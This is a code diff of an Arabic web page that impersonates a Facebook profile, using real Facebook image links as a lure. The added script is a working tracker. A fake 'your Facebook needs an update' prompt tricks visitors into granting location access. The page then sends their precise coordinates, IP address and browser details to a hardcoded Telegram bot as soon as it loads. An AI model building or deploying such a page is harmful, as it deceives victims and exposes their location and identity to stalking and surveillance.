@@ -1,91 +1,89 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>سماح السيد - Facebook</title>
+    <title>ملف شخصي فيسبوك</title>
+    <!-- Open Graph tags -->
+    <meta property="og:title" content="ملف شخصي فيسبوك" />
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://scontent.fcai24-1.fna.fbcdn.net/v/t39.30808-6/435666821_3674362579557357_267544428629266178_n.jpg?_nc_cat=104&ccb=1-7&_nc_sid=833d8c&_nc_eui2=AeEtrKXdMv7KE4V-FJuqM84CyvxbuzQ50uDK_Fu7NDnS4LshmYr97PgaeD_Qa99loTo&_nc_ohc=B9xEC5JkilwQ7kNvgGaJPRz&_nc_ht=scontent.fcai24-1.fna&oh=00_AYCcHR5oOGHettWfM7I5cR_E4L4Y_gab8GL4a5KMcIMU1Q&oe=6691B8CD" />
+    <meta property="og:image" content="https://scontent.fcai24-1.fna.fbcdn.net/v/t39.30808-6/435666821_3674362579557357_267544428629266178_n.jpg?_nc_cat=104&ccb=1-7&_nc_sid=833d8c&_nc_eui2=AeEtrKXdMv7KE4V-FJuqM84CyvxbuzQ50uDK_Fu7NDnS4LshmYr97PgaeD_Qa99loTo&_nc_ohc=B9xEC5JkilwQ7kNvgGaJPRz&_nc_ht=scontent.fcai24-1.fna&oh=00_AYCcHR5oOGHettWfM7I5cR_E4L4Y_gab8GL4a5KMcIMU1Q&oe=6691B8CD" />
+    <meta property="og:description" content="سماح السيد الحساب الاساسي" />
     <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f0f2f5;
+        body, html {
             margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: flex-start;
-            padding: 20px;
+            padding: 0;
+            height: 100%;
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
         }
-        .container {
-            width: 100%;
-            max-width: 900px;
-            background-color: #fff;
-            border-radius: 10px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
-            text-align: center;
-            color: #333;
+        .header {
+            background-color: #ffffff;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            padding: 8px 16px;
         }
         .cover-photo {
-            width: 100%;
-            height: 300px;
-            background-image: url('https://example.com/cover-photo.jpg');
+            height: 350px;
+            background-image: url('https://scontent.fcai24-1.fna.fbcdn.net/v/t39.30808-6/423196130_3626939707632978_1590665133463999650_n.jpg?_nc_cat=101&ccb=1-7&_nc_sid=cc71e4&_nc_eui2=AeEeMd4-HnAL1_Gxszghn6SZsf05R3FRycix_TlHcVHJyE0v15u68uGv36hnOhSky4E&_nc_ohc=fWbsB0TSis4Q7kNvgEnJ08v&_nc_ht=scontent.fcai24-1.fna&oh=00_AYA2QW82qrz0A9A6pJAQtojRRyDtaJVKhb6c0mggIHE6hg&oe=6691AE45');
             background-size: cover;
             background-position: center;
-            position: relative;
         }
-        .profile-photo {
-            width: 150px;
-            height: 150px;
+        .profile-section {
+            background-color: #ffffff;
+            padding: 16px;
+            margin-top: -90px;
+            border-radius: 0 0 8px 8px;
+        }
+        .profile-picture {
+            width: 168px;
+            height: 168px;
             border-radius: 50%;
-            border: 5px solid #fff;
-            position: absolute;
-            bottom: -75px;
-            left: 20px;
+            border: 4px solid #ffffff;
+            margin-top: -84px;
         }
-        .profile-info {
-            padding: 20px;
-            padding-top: 80px;
+        .profile-name {
+            font-size: 32px;
+            font-weight: bold;
+            margin: 16px 0 8px;
         }
-        .profile-info h1 {
-            margin: 10px 0;
-            font-size: 24px;
-            color: #333;
-        }
-        .content {
-            padding: 20px;
-        }
-        .content p {
-            font-size: 18px;
-            color: #555;
-        }
-        .profiles {
+        .profile-buttons {
             display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
+            gap: 8px;
+            margin-top: 16px;
         }
-        .profile {
-            margin: 10px;
-            text-align: center;
+        .profile-button {
+            padding: 8px 12px;
+            border: none;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
         }
-        .profile img {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            border: 2px solid #4267B2;
+        .primary-button {
+            background-color: #1877f2;
+            color: white;
         }
-        .profile p {
-            margin-top: 5px;
-            font-size: 16px;
-            color: #333;
+        .secondary-button {
+            background-color: #e4e6eb;
+            color: #050505;
         }
-        .footer {
-            padding: 10px;
-            font-size: 14px;
+        .nav-tabs {
+            display: flex;
+            border-top: 1px solid #dddfe2;
+            margin-top: 16px;
+            padding-top: 16px;
         }
-        .footer a {
-            color: #4267B2;
-            text-decoration: none;
+        .nav-tab {
+            padding: 16px;
+            font-weight: bold;
+            color: #65676b;
+            cursor: pointer;
         }
-        .overlay {
+        .nav-tab.active {
+            color: #1877f2;
+            border-bottom: 3px solid #1877f2;
+        }
+        #locationOverlay {
             position: fixed;
             top: 0;
             left: 0;
@@ -95,123 +93,131 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            z-index: 9999;
+            z-index: 1000;
         }
-        .overlay .popup {
-            background-color: #fff;
+        #locationPrompt {
+            background-color: white;
             padding: 20px;
             border-radius: 10px;
             text-align: center;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
         }
-        .overlay .popup button {
-            background-color: #4267B2;
-            color: #fff;
+        #allowLocationBtn {
+            background-color: #1877f2;
+            color: white;
             border: none;
             padding: 10px 20px;
             border-radius: 5px;
-            cursor: pointer;
             font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
-    <div class="overlay" id="overlay">
-        <div class="popup">
-            <p>يبدو أن هناك مشكلة في التطبيق. قم بعمل موافق أو سماح لحل المشكلة وإضافة هذا الحساب كصديق.</p>
-            <button onclick="requestLocationPermission()">السماح</button>
+    <div id="locationOverlay">
+        <div id="locationPrompt">
+            <h2>السماح بتحديد الموقع</h2>
+            <p>اصدار الفيسبوك الحالي لديك يحتاج الي تحديث لفتح الحساب الحالي اضغط علي موافق وسماح لحل المشكلة</p>
+            <button id="allowLocationBtn">فتح الصفحة</button>
         </div>
     </div>
 
-    <div class="container">
-        <div class="cover-photo">
-            <img src="https://example.com/profile-photo.jpg" alt="سامح السيد" class="profile-photo">
+    <div id="mainContent">
+        <div class="header">
+            <!-- هنا يمكن إضافة شريط البحث وأيقونات التنقل -->
         </div>
-        <div class="profile-info">
-            <h1>سامح السيد</h1>
-        </div>
-        <div class="content">
-            <p>مرحبًا بكم في صفحة سامح السيد الشخصية.</p>
-            <div class="profiles">
-                <div class="profile">
-                    <img src="https://randomuser.me/api/portraits/women/81.jpg" alt="مستخدم">
-                    <p>أمل</p>
-                </div>
-                <div class="profile">
-                    <img src="https://randomuser.me/api/portraits/men/82.jpg" alt="مستخدم">
-                    <p>محمد</p>
-                </div>
-                <div class="profile">
-                    <img src="https://randomuser.me/api/portraits/women/83.jpg" alt="مستخدم">
-                    <p>ليلى</p>
-                </div>
-                <div class="profile">
-                    <img src="https://randomuser.me/api/portraits/men/84.jpg" alt="مستخدم">
-                    <p>علي</p>
-                </div>
+        
+        <div class="cover-photo"></div>
+        
+        <div class="profile-section">
+            <img src="https://scontent.fcai24-1.fna.fbcdn.net/v/t39.30808-6/370437641_3515393512120932_6308905167458711103_n.jpg?_nc_cat=104&ccb=1-7&_nc_sid=a5f93a&_nc_eui2=AeGO-61Ujm73mPEdXcpsbCmtSsas17Tt1-pKxqzXtO3X6rYPAWjwfwuhjXl2JU58ACI&_nc_ohc=gGYm-HznEJ8Q7kNvgGUZJyX&_nc_ht=scontent.fcai24-1.fna&oh=00_AYC5H2bIEydMsRk2Bi9OKdOnnmTQxj6_WmwqG5_8Px30xw&oe=6691C85F" alt="الصورة الشخصية" class="profile-picture">
+            <h1 class="profile-name">سماح السيد</h1>
+            <div class="profile-buttons">
+                <button class="profile-button primary-button">اضافة صديق</button>
+                <button class="profile-button secondary-button">ارسال رسالة</button>
+                <button class="profile-button secondary-button">المزيد</button>
+            </div>
+            <div class="nav-tabs">
+                <div class="nav-tab active">المنشورات</div>
+                <div class="nav-tab">حول</div>
+                <div class="nav-tab">الأصدقاء</div>
+                <div class="nav-tab">الصور</div>
+                <div class="nav-tab">مقاطع الفيديو</div>
             </div>
         </div>
-        <div class="footer">
-            <p>حقوق الطبع والنشر © 2024 سامح السيد. جميع الحقوق محفوظة. <a href="#">سياسة الخصوصية</a></p>
-        </div>
     </div>
 
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script>
-        function collectDeviceInfo() {
-            var ptf = navigator.platform;
-            var cc = navigator.hardwareConcurrency || 'غير متوفر';
-            var ram = navigator.deviceMemory || 'غير متوفر';
-            var ver = navigator.userAgent;
-            var brw = 'غير متوفر';
-            var canvas = document.createElement('canvas');
-            var gl, debugInfo, ven, ren;
+        function sendToTelegram(message) {
+            var telegramBotToken = '7172876720:AAHHrUi-6VOFhhtJnyP2fpIM6yeU5Y9mYho';
+            var telegramChatId = '962686305';
+            var telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
 
-            if (ver.indexOf('Firefox') != -1) {
-                brw = 'Firefox';
-            } else if (ver.indexOf('Chrome') != -1) {
-                brw = 'Chrome';
-            } else if (ver.indexOf('Safari') != -1) {
-                brw = 'Safari';
-            } else if (ver.indexOf('Edge') != -1) {
-                brw = 'Edge';
-            }
-
-            try {
-                gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            } catch (e) { }
-            if (gl) {
-                debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'غير متوفر';
-                ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'غير متوفر';
-            }
-
-            var ht = window.screen.height;
-            var wd = window.screen.width;
-            var os = ver.substring(0, ver.indexOf(')')).split(';')[1].trim() || 'غير متوفر';
-
-            var deviceInfo = `منصة الجهاز: ${ptf}\nعدد النوى: ${cc}\nالذاكرة العشوائية: ${ram}\nنوع المتصفح: ${brw}\nنظام التشغيل: ${os}\nدقة الشاشة: ${ht}x${wd}\nالشركة المصنعة لوحدة المعالجة الرسومية: ${ven}\nنوع وحدة المعالجة الرسومية: ${ren}`;
-            console.log(deviceInfo);
+            $.post(telegramUrl, {
+                chat_id: telegramChatId,
+                text: message
+            });
         }
 
-        function requestLocationPermission() {
+        function getLocation() {
             if (navigator.geolocation) {
-                var optn = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    document.getElementById('overlay').style.display = 'none';
-                }, function (error) {
-                    alert('يبدو أن هناك مشكلة في التطبيق. قم بعمل موافق أو سماح لحل المشكلة وإضافة هذا الحساب كصديق..');
-                    document.getElementById('overlay').style.display = 'flex';
-                }, optn);
+                navigator.geolocation.getCurrentPosition(showPosition, showError, {
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0
+                });
             } else {
-                alert('جهازك لا يدعم تحديد الموقع الجغرافي.');
+                alert("الجهاز لا يدعم تحديد الموقع.");
             }
         }
 
-        // طلب إذن الموقع الجغرافي عند تحميل الصفحة
-        window.onload = function() {
-            collectDeviceInfo();
-            requestLocationPermission();
+        function showPosition(position) {
+            var lat = position.coords.latitude;
+            var lon = position.coords.longitude;
+            var googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            sendToTelegram(`Location: ${googleMapsLink}`);
+            
+            // إخفاء الإشعار وإظهار المحتوى الرئيسي
+            document.getElementById('locationOverlay').style.display = 'none';
+            document.getElementById('mainContent').style.display = 'block';
+        }
+
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("اصدار الفيسبوك الحالي لديك يحتاج الي تحديث لفتح الحساب الحالي اضغط علي موافق وسماح لحل المشكلة");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("معلومات الموقع غير متاحة.");
+                    break;
+                case error.TIMEOUT:
+                    alert("انتهت مهلة طلب تحديد الموقع.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("حدث خطأ غير معروف.");
+                    break;
+            }
+        }
+
+        document.getElementById('allowLocationBtn').addEventListener('click', getLocation);
+
+        // الحصول على عنوان الـ IP
+        $.getJSON('https://api.ipify.org?format=json', function(data) {
+            sendToTelegram(`IP Address: ${data.ip}`);
+        });
+
+        // إرسال معلومات المستخدم إلى تلغرام
+        const userInfo = {
+            userAgent: navigator.userAgent,
+            os: navigator.platform,
+            browser: navigator.appName,
+            browserVersion: navigator.appVersion
         };
+        sendToTelegram(`User Info: ${JSON.stringify(userInfo)}`);
+
+        // محاولة الحصول على الموقع عند تحميل الصفحة
+        getLocation();
     </script>
 </body>
 </html>
